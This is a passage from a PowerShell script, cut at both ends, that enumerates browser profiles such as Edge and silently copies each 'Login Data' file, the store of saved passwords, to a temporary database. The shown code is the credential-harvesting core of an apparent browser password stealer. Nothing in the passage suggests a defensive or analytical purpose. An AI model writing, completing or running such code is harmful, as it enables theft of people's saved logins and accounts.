        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
    )
    $logins = @()
    foreach ($b in $browsers) {
        if (Test-Path $b.Path) {
            try {
                $temp = "$env:TEMP\login_temp.db"
                Copy-Item $b.Path -Destination $temp -Force -ErrorAction SilentlyContinue
